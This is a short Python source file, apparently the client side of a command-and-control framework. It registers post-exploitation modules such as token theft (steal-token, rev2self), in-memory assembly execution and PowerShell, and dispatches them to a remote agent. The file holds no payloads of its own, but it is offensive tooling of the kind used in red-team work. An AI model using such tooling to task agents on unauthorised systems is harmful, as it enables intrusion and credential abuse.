from libs.client.modules.whoami import *
from libs.client.modules.steal_token import *
from libs.client.modules.rev2self import *
from libs.client.modules.powershell import *
from libs.client.modules.executeassembly import *
from libs.client.modules.ps import *

class ModuleHolder:

    def __init__(self):
        self.modules = {
            "execute-assembly":ExecuteAssembly,
            "steal-token":StealToken,
            "rev2self":Rev2Self,
            "whoami":Whoami,
            "powershell":Powershell,
            "ps":GetProcess
        }

    
    def is_module_installed(self,module_name):
        return module_name in self.modules.keys()
    
    def execute_module(self,tsobj, module_name, entire_splitted_command,agent):
        module = self.modules[module_name](tsobj,entire_splitted_command,agent)
        try:
            module.run()
            print("\033[92m\n[+] Tasked agent\n\033[0m")
        except:
            return "[Error] Module Failed"
        return "[Success] Module successfully sent"